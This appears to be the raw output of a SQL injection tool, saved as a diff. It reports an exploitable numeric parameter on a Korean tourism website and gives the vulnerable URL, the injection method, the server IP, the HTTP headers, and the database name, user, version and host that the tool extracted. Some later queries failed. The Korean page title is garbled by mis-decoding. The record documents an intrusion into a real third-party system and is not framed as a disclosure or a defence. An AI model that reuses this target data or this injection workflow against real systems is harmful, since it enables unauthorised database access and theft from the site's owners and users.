@@ -1,0 +1,47 @@
+■漏洞信息:============================================================
+ ·URL:http://www.daegutour.net/web/pkg/pkg_view.asp?menu_id=44&id=83
+ ·页面标题：胶虐,贰橇泼,抛付咯青傈巩 措备包堡饭历努反 规巩阑 券康钦聪促.
+ ·参数:menu_id=44&id=83
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.108.62.146
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:04:53 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 37258
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAACDSQQQ=NFOEPHCAICCEAIDIOFIIEJBJ; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：tourtour
+- 用户名：tourtour
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：NS2
+- 服务名：MSSQLSERVER
+- 系统用户名：tourtour
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
